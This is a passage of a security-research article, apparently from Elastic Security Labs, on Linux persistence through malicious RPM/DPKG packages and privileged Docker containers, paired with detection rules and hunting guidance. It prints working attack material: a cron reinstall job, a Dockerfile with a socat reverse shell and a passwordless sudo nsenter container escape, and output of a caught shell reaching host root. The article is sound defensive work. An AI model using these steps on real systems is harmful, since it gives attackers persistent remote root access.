~/rpmbuild/SPECS/\\${PACKAGE_NAME}.spec\n\n# Install RPM package with forced overwrite\nVER=$(grep VERSION_ID /etc/os-release | cut -d '\"' -f 2 | cut -d '.' -f 1)\nrpm -i --force ~/rpmbuild/RPMS/x86_64/\\${PACKAGE_NAME}-1.0-1.el\\${VER}.x86_64.rpm\nmv ~/rpmbuild/RPMS/x86_64/\\${PACKAGE_NAME}-1.0-1.el\\${VER}.x86_64.rpm /var/lib/rpm/\\${PACKAGE_NAME}.rpm\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon installation, the payload will be executed. Again, the following \",(0,n.jsx)(e.code,{children:\"Cron\"}),\" job is created to ensure persistence on a one-minute interval:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.code,{children:'echo \"*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm \u003e /dev/null 2\u003e\u00261\" | crontab'})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Let\\u2019s examine the traces that the \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" package technique leaves behind:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/approaching-the-summit-on-persistence/image5.png\",alt:\"PANIX malicious-package module execution visualized in Kibana (RPM)\",width:\"1485\",height:\"1266\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon PANIX execution, the \",(0,n.jsx)(e.code,{children:\"panix.spec\"}),\" file is created and populated. Next, \",(0,n.jsx)(e.code,{children:\"rpmbuild\"}),\" is used to build the package, and \",(0,n.jsx)(e.code,{children:\"rpm -i\"}),\" is executed to install the package. Upon installation, the \",(0,n.jsx)(e.code,{children:\"%post\"}),\" payload is executed, leading to an execution of the reverse shell chain (\",(0,n.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"bash\"}),\") with a \",(0,n.jsx)(e.code,{children:\"process.parent.command_line\"}),\" of \",(0,n.jsx)(e.code,{children:\"/bin/sh /var/tmp/rpm-tmp.HjtRV5 1\"}),\", indicating the execution of an \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" package. After installation, \",(0,n.jsx)(e.code,{children:\"Crontab\"}),\" is altered to execute the payload once, at one minute intervals for consistency.\",(0,n.jsx)(e.br,{}),`\n`,\"Let\\u2019s take a look at the coverage:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover installer package (DPKG \u0026 RPM) persistence\"})}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,n.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_rpm_package_installation_from_unusual_parent.toml\",rel:\"nofollow\",children:\"RPM Package Installed by Unusual Parent Process\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_unusual_execution.toml\",rel:\"nofollow\",children:\"Unusual DPKG Execution\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_package_installation_from_unusual_parent.toml\",rel:\"nofollow\",children:\"DPKG Package Installed by Unusual Parent Process\"})]})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Network\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_default_dpkg_directory.toml\",rel:\"nofollow\",children:\"Egress Network Connection from Default DPKG Directory\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_rpm_package.toml\",rel:\"nofollow\",children:\"Egress Network Connection from RPM Package\"})]})]})]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\u003e ./panix.sh --revert malicious-package\n\n[+] Reverting malicious package...\n[+] Removing DPKG package 'panix'...\n[+] DPKG package 'panix' removed successfully.\n[+] Removing cron job associated with 'panix'...\n[+] Cron job removed.\n[+] Cleaning up '/var/lib/dpkg/info'...\n[+] Cleanup completed.\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"hunting-for-t1546016---installer-packages-dpkg--rpm\",children:\"Hunting for T1546.016 - Installer Packages: DPKG \u0026 RPM\"}),`\n`,(0,n.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to package management tools. The approach includes monitoring for the following:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"File creation or modification in package management directories:\"}),\" Tracks unusual changes to files in paths like \",(0,n.jsx)(e.code,{children:\"/var/lib/dpkg/info/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/var/lib/rpm/\"}),\", excluding common benign patterns such as checksum or list files.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Processes executed from lifecycle scripts:\"}),\" Observes commands and processes launched from directories like \",(0,n.jsx)(e.code,{children:\"/var/tmp/rpm-tmp.*\"}),\" and \",(0,n.jsx)(e.code,{children:\"/var/lib/dpkg/info/\"}),\", which may indicate suspicious or unauthorized activity.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Detailed metadata on modified files:\"}),\" Uses OSQuery to gather additional file metadata, including ownership and timestamps, for forensic analysis of package management activity.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_rpm_dpkg_installer_packages.md\",rel:\"nofollow\",children:\"Persistence via DPKG/RPM Package\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/016/\",rel:\"nofollow\",children:\"T1546.016\"}),\".\"]}),`\n`,(0,n.jsx)(e.h1,{id:\"t1610---deploy-container\",children:\"T1610 - Deploy Container\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Host escape involves exploiting vulnerabilities, misconfigurations, or excessive permissions in containerized or virtualized environments to gain access to the underlying host system. Technologies like Docker, Kubernetes, and VMware aim to isolate workloads, but improper configurations or shared resources can allow attackers to break out of the container and compromise the host. MITRE tracks container deployment under identifier \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1610/\",rel:\"nofollow\",children:\"T1610\"}),\".\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1610---deploy-container-malicious-docker-container\",children:\"T1610 - Deploy Container: Malicious Docker Container\"}),`\n`,(0,n.jsx)(e.p,{children:\"Docker containers are particularly susceptible to host escapes when improperly secured. Attackers may exploit vulnerabilities or misconfigurations in two main ways:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"1. Manipulating a Running Container\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Attackers abuse misconfigured containers to execute commands affecting the host. Common scenarios include:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Privileged Mode\"}),\": Containers running with \",(0,n.jsx)(e.code,{children:\"--privileged\"}),\" can directly interact with host resources. For example, attackers may load kernel modules or access host-level devices.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Excessive Capabilities\"}),\": Containers with the \",(0,n.jsx)(e.code,{children:\"CAP_SYS_ADMIN\"}),\" capability can perform privileged operations, such as mounting filesystems or accessing \",(0,n.jsx)(e.code,{children:\"/dev\"}),\" devices.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Sensitive Volume Access\"}),\": Volumes like \",(0,n.jsx)(e.code,{children:\"/var/run/docker.sock\"}),\" allow attackers to issue Docker commands to the host.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Host Namespace Access\"}),\": Containers configured with \",(0,n.jsx)(e.code,{children:\"--pid=host\"}),\" or \",(0,n.jsx)(e.code,{children:\"--net=host\"}),\" expose the host's process and network namespaces. Attackers can escalate privileges by targeting processes or manipulating network configurations directly.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"2. Deploying a Malicious Container\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Attackers deploy custom containers designed to break out of isolation. These containers often include:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Exploits targeting runtime vulnerabilities or kernel bugs.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Scripts for privilege escalation or persistence, such as reverse shells or C2 beacons.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Malicious configurations enabling unauthorized access to host resources.\"}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"In the next section, we will take a look at an example of a malicious docker container implementation.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"persistence-through-t1610---deploy-container-malicious-docker-container\",children:\"Persistence through T1610 - Deploy Container: Malicious Docker Container\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"In this scenario, we will take a look at how to simulate the creation of an exemplary malicious Docker container through PANIX. Within the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_docker_container.sh\",rel:\"nofollow\",children:\"setup_malicious_docker_container.sh\"}),\" module, PANIX creates a Dockerfile with the following contents:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`FROM alpine:latest\n\nRUN apk add --no-cache bash socat sudo util-linux procps\n\nRUN adduser -D lowprivuser\n\nRUN echo '#!/bin/bash' \u003e /usr/local/bin/entrypoint.sh \\\\\\\\\n\t\u0026\u0026 echo 'while true; do /bin/bash -c \"socat exec:\\\\\"/bin/bash\\\\\",pty,stderr,setsid,sigint,sane tcp:$ip:$port\"; sleep 60; done' \u003e\u003e /usr/local/bin/entrypoint.sh \\\\\\\\\n\t\u0026\u0026 chmod +x /usr/local/bin/entrypoint.sh\n\nRUN echo '#!/bin/bash' \u003e /usr/local/bin/escape.sh \\\\\\\\\n\t\u0026\u0026 echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' \u003e\u003e /usr/local/bin/escape.sh \\\\\\\\\n\t\u0026\u0026 chmod +x /usr/local/bin/escape.sh \\\\\\\\\n\t\u0026\u0026 echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' \u003e\u003e /etc/sudoers\n\nUSER lowprivuser\n\nENTRYPOINT [\"/usr/local/bin/entrypoint.sh\"]\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The Dockerfile sets up a lightweight Alpine Linux container with tools like \",(0,n.jsx)(e.code,{children:\"bash\"}),\", \",(0,n.jsx)(e.code,{children:\"socat\"}),\", and \",(0,n.jsx)(e.code,{children:\"nsenter\"}),\". The \",(0,n.jsx)(e.code,{children:\"entrypoint.sh\"}),\" script ensures continuous reverse shell access by repeatedly connecting to a remote server using \",(0,n.jsx)(e.code,{children:\"socat\"}),\". The \",(0,n.jsx)(e.code,{children:\"escape.sh\"}),\" script, which is granted passwordless \",(0,n.jsx)(e.code,{children:\"sudo\"}),\" permissions, uses \",(0,n.jsx)(e.code,{children:\"nsenter\"}),\" to attach to the host's namespaces (e.g., mount, network, PID) via the init process, effectively breaking container isolation.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"The container is built using:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.code,{children:\"docker build -t malicious-container -f $DOCKERFILE . \u0026\u0026 \\\\\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Where the \",(0,n.jsx)(e.code,{children:\"-t\"}),\" flag tags the container for easy identification, and \",(0,n.jsx)(e.code,{children:\"-f\"}),\" specifies the Dockerfile path.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"It is then run with:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.code,{children:\"docker run -d --name malicious-container --privileged --pid=host malicious-container\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Where the \",(0,n.jsx)(e.code,{children:\"--privileged\"}),\" flag allows full access to host resources, bypassing Docker\\u2019s isolation mechanisms, while \",(0,n.jsx)(e.code,{children:\"--pid=host\"}),\" shares the host's process namespace, enabling the container to interact directly with host-level processes.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"To test this technique, Docker must be installed, and the user running the simulation must either have root or docker group permissions. Let\\u2019s run the payload and examine the logs through the execution of the following PANIX command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`sudo ./panix.sh --malicious-container --ip 192.168.100.1 --port 2021\n\n =\u003e [1/5] FROM [installing ...]\n =\u003e [2/5] RUN apk add --no-cache bash socat sudo util-linux procps\n =\u003e [3/5] RUN adduser -D lowprivuser\n =\u003e [4/5] RUN echo '#!/bin/bash' \u003e /usr/local/bin/entrypoint.sh \u0026\u0026 echo 'while true; do /bin/bash -c \"socat exec:\n =\u003e [5/5] RUN echo '#!/bin/bash' \u003e /usr/local/bin/escape.sh \u0026\u0026 echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -'\n\n9543f7ce4c6a8defcad36358f00eb4d38a85a8688cc8ecd5f15a5a2d3f43383b\n\n[+] Malicious Docker container created and running.\n[+] Reverse shell is executed every minute.\n[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'.\n[+] Docker container persistence established!\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After catching the shell on the attacker\\u2019s machine, run the \",(0,n.jsx)(e.code,{children:\"/usr/local/bin/escape.sh\"}),\" script to escape the container:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\\u276F nc -nvlp 2021\nlistening on [any] 2021 ...\nconnect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 44726\n\n9543f7ce4c6a:/$ /usr/local/bin/escape.sh\nroot@debian10-persistence:~# hostname\ndebian10-persistence\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Upon execution, the following logs are generated:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/approaching-the-summit-on-persistence/image6.png\",alt:\"PANIX malicious-container module execution visualized in Kibana\",width:\"1429\",height:\"1083\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The execution of \",(0,n.jsx)(e.code,{children:\"panix.sh\"}),\" initiates the creation of the \",(0,n.jsx)(e.code,{children:\"/tmp/Dockerfile\"}),\". The build command is then executed to create the container based on the specified configuration. Once built, the container is launched with the \",(0,n.jsx)(e.code,{children:\"--privileged\"}),\" and \",(0,n.jsx)(e.code,{children:\"--pid=host\"}),\" flags, enabling the necessary capabilities for host escape. Upon startup, the container runs the \",(0,n.jsx)(e.code,{children:\"/usr/local/bin/entrypoint.sh\"}),\" script, which successfully establishes a reverse shell connection to the attacker\\u2019s machine using \",(0,n.jsx)(e.code,{children:\"socat\"}),\". After the shell is caught, the \",(0,n.jsx)(e.code,{children:\"/usr/local/bin/escape.sh\"}),\" script is executed, effectively breaking out of the container and gaining access to the host.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s take a look at the coverage:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover malicious Docker container persistence\"})}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,n.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_potentially_overly_permissive_container_creation.toml\",rel:\"nofollow\",children:\"Privileged Docker Container Creation\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_escape_via_nsenter.toml\",rel:\"nofollow\",children:\"Docker Escape via Nsenter\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_mount_chroot_container_escape.toml\",rel:\"nofollow\",children:\"Potential Chroot Container Escape via Mount\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_container_util_misconfiguration.toml\",rel:\"nofollow\",children:\"Potential Privilege Escalation via Container Misconfiguration\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_writable_docker_socket.toml\",rel:\"nofollow\",children:\"Potential Privilege Escalation through Writable Docker Socket\"})]})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Network\"}),(0,n.jsx)(e.td,{align:\"left\",children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_egress_connection_from_entrypoint_in_container.toml\",rel:\"nofollow\",children:\"Egress Connection from Entrypoint in Container\"})})]})]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Besides the rules mentioned above, we also have a dedicated set of container rules that leverages our \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/integrations/current/cloud_defend.html\",rel:\"nofollow\",children:\"Defend for Containers integration\"}),\", which can be found in the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main/rules/integrations/cloud_defend\",rel:\"nofollow\",children:\"cloud_defend\"}),\" directory of our \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"detection-rules repository\"}),\". We have also extended our protections through the integration of Falco with Elastic Security. This integration significantly enhances threat detection directly at the edge \\u2014 whether in Docker containers, Kubernetes clusters, Linux virtual machines, or bare metal environments. By introducing dedicated Falco connectors, we've strengthened Elastic's capabilities to improve cloud workload protection and endpoint security strategies.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"For a deeper dive into how our Falco integration secures container workloads, check out our recent blog, \",(0,n.jsxs)(e.em,{children:[\"\\u201C\",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/blog/falco-elastic-security-cloud-workload-protection\",rel:\"nofollow\",children:\"Securing the Edge: Harnessing Falco\\u2019s Power with Elastic Security for Cloud Workload Protection\"}),\"\\u201D\"]}),\". The blog covers Falco setup, rule creation, alerting, and explores various threat scenarios.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\u003e ./panix.sh --revert malicious-container\n\n[+] Stopping and removing the 'malicious-container'...\n[+] Container 'malicious-container' stopped and removed.\n[+] Removing Docker image 'malicious-container'...\n[+] Docker image 'malicious-container' removed.\n[+] Removing Dockerfile at /tmp/Dockerfile...\n[+] Dockerfile removed.\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"hunting-for-t1610---deploy-container-malicious-docker-container\",children:\"Hunting for T1610 - Deploy Container: Malicious Docker Container\"}),`\n`,(0,n.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious container activity and configurations. The approach includes monitoring for the following:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Unusual network connections from Docker containers:\"}),\" Tracks connections to external or non-local IP addresses initiated by processes under \",(0,n.jsx)(e.code,{children:\"/var/lib/docker/*\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Privileged Docker containers:\"}),\" Identifies containers running in privileged mode, which pose a higher risk of host compromise.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Recently created containers and images:\"}),\" Observes Docker containers and images created or pulled within the last 7 days to detect unauthorized deployments or suspicious additions.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Sensitive host directory mounts:\"}),\" Monitors container mounts accessing paths like \",(0,n.jsx)(e.code,{children:\"/var/run/docker.sock\"}),\", \",(0,n.jsx)(e.code,{children:\"/etc\"}),\", or the root directory (\",(0,n.jsx)(e.code,{children:\"/\"}),\"), which could enable container escape or unauthorized host access.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_malicious_docker_container.md\",rel:\"nofollow\",children:\"Persistence via Docker Container\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1610/\",rel:\"nofollow\",children:\"T1610\"}),\".\"]}),`\n`,(0,n.jsx)(e.h1,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,n.jsxs)(e.p,{children:['In this fourth chapter of the \"Linux Detection Engineering\" series, we examined additional persistence techniques that adversaries may leverage on Linux systems. We explored the abuse of PAM modules and ',(0,n.jsx)(e.code,{children:\"pam_exec\"}),\" for executing malicious code during authentication events. After PAM, we looked into installer package manipulation via \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" and \",(0,n.jsx)(e.code,{children:\"DPKG\"}),\", where lifecycle scripts are weaponized for persistence during the package installation/updating process. We finalized this part by examining malicious Docker containers, detailing how privileged containers and host-level access can be exploited for persistence and container escape.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"These techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. By leveraging \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\" to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided, you can build robust defenses and fine-tune your detection strategies.\"]})]})}function v(i={}){let{wrapper:e}=i.components||{};return e?(0,n.jsx)(e,Object.assign({},i,{children:(0,n.jsx)(d,i)})):d(i)}var _=v;return y(x);})();\n;return Component;"},"_id":"articles/approaching-the-summit-on-persistence.mdx","_raw":{"sourceFilePath":"articles/approaching-the-summit-on-persistence.mdx","sourceFileName":"approaching-the-summit-on-persistence.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/approaching-the-summit-on-persistence"},"type":"Article","imageUrl":"/assets/images/approaching-the-summit-on-persistence/Security Labs Images 32.jpg","readingTime":"34 min read","series":"","url":"/approaching-the-summit-on-persistence","headings":[{"level":2,"title":"T1556.003 - Pluggable Authentication Modules: Malicious PAM","href":"#t1556003---pluggable-authentication-modules-malicious-pam"},{"level":3,"title":"Persistence through T1556.003 - Pluggable Authentication Modules: Malicious PAM","href":"#persistence-through-t1556003---pluggable-authentication-modules-malicious-pam"},{"level":3,"title":"Hunting for T1556.003 - Pluggable Authentication Modules (Malicious PAM)","href":"#hunting-for-t1556003---pluggable-authentication-modules-malicious-pam"},{"level":2,"title":"T1556.003 - Pluggable Authentication Modules: pam\\_exec.so","href":"#t1556003---pluggable-authentication-modules-pam_execso"},{"level":3,"title":"Persistence through T1556.003 - Pluggable Authentication Modules: pam\\_exec.so","href":"#persistence-through-t1556003---pluggable-authentication-modules-pam_execso"},{"level":3,"title":"Hunting for T1556.003 - Pluggable Authentication Modules: pam\\_exec.so","href":"#hunting-for-t1556003---pluggable-authentication-modules-pam_execso"},{"level":2,"title":"T1546.016 - Installer Packages: DPKG \u0026 RPM","href":"#t1546016---installer-packages-dpkg--rpm"},{"level":3,"title":"Persistence through T1546.016 - Installer Packages: DPKG \u0026 RPM","href":"#persistence-through-t1546016---installer-packages-dpkg--rpm"},{"level":3,"title":"Hunting for T1546.016 - Installer Packages: DPKG \u0026 RPM","href":"#hunting-for-t1546016---installer-packages-dpkg--rpm"},{"level":2,"title":"T1610 - Deploy Container: Malicious Docker Container","href":"#t1610---deploy-container-malicious-docker-container"},{"level":3,"title":"Persistence through T1610 \\- Deploy Container: Malicious Docker Container","href":"#persistence-through-t1610---deploy-container-malicious-docker-container"},{"level":3,"title":"Hunting for T1610 - Deploy Container: Malicious Docker Container ","href":"#hunting-for-t1610---deploy-container-malicious-docker-container-"}],"author":[{"title":"Ruben Groenewoud","slug":"ruben-groenewoud","description":"Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var _=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},a=(e,t,n,u)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let o of g(t))!l.call(e,o)\u0026\u0026o!==n\u0026\u0026s(e,o,{get:()=\u003et[o],enumerable:!(u=d(t,o))||u.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(f(e)):{},a(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),b=e=\u003ea(s({},\"__esModule\",{value:!0}),e);var i=_((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003eh,frontmatter:()=\u003ew});var r=p(i()),w={title:\"Ruben Groenewoud\",description:\"Security Research Engineer, Elastic\",slug:\"ruben-groenewoud\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var h=M;return b(y);})();\n;return Component;"},"_id":"authors/ruben-groenewoud.mdx","_raw":{"sourceFilePath":"authors/ruben-groenewoud.mdx","sourceFileName":"ruben-groenewoud.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/ruben-groenewoud"},"type":"Author","imageUrl":"","url":"/authors/ruben-groenewoud"}],"category":[{"title":"Security research","slug":"security-research","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,j=Object.prototype.hasOwnProperty;var l=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),d=(t,e)=\u003e{for(var r in e)s(t,r,{get:e[r],enumerable:!0})},c=(t,e,r,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!j.call(t,o)\u0026\u0026o!==r\u0026\u0026s(t,o,{get:()=\u003ee[o],enumerable:!(a=f(e,o))||a.enumerable});return t};var h=(t,e,r)=\u003e(r=t!=null?x(g(t)):{},c(e||!t||!t.__esModule?s(r,\"default\",{value:t,enumerable:!0}):r,t)),p=t=\u003ec(s({},\"__esModule\",{value:!0}),t);var i=l((X,u)=\u003e{u.exports=_jsx_runtime});var D={};d(D,{default:()=\u003eC,frontmatter:()=\u003ey});var n=h(i()),y={title:\"Security research\",slug:\"security-research\"};function m(t){return(0,n.jsx)(n.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,n.jsx)(e,Object.assign({},t,{children:(0,n.jsx)(m,t)})):m(t)}var C=M;return p(D);})();\n;return Component;"},"_id":"categories/security-research.mdx","_raw":{"sourceFilePath":"categories/security-research.mdx","sourceFileName":"security-research.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/security-research"},"type":"Category","url":"/categories/security-research"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"approaching-the-summit-on-persistence"},"buildId":"4Kiz4W6h6K4GvjoQBSLKb","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>